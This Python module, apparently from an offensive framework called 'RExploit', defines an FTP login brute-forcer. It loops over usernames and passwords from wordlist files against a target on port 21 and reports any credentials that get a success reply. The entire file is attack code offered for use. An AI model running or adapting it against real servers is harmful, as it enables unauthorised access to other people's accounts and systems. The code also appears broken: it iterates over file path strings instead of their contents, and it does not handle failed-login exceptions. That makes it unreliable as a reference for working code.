from ftplib import FTP

from interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Attack FTP login service",
            category="bf",
            authors={
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "All"
            ],
            date="11/04/2016",
            cwe="255",
            description="This a generic exploit for attack login via FTP (port 21). Test with credentials create by generator or dictionary."
        )

    def default(self):
        data = {"port": "21",
                "users": "wordlist/users.txt",
                "passwords": "wordlist/passwords.txt"}

        return data

    def run(self, data):
        port = data["port"]
        users = data["users"]
        passwords = data["passwords"]
        message = ""

        for user in users:
            for password in passwords:
                ftp = FTP()
                ftp.connect(self.ip, port)
                response = ftp.login(user, password)

                if '230' in response:
                    message += "Success!\nCredentials found\nUsername: {0} Password: {1}\n".format(user, password)

                ftp.close()

        if message == "":
            message = "Error. Credentials not found"

        return message
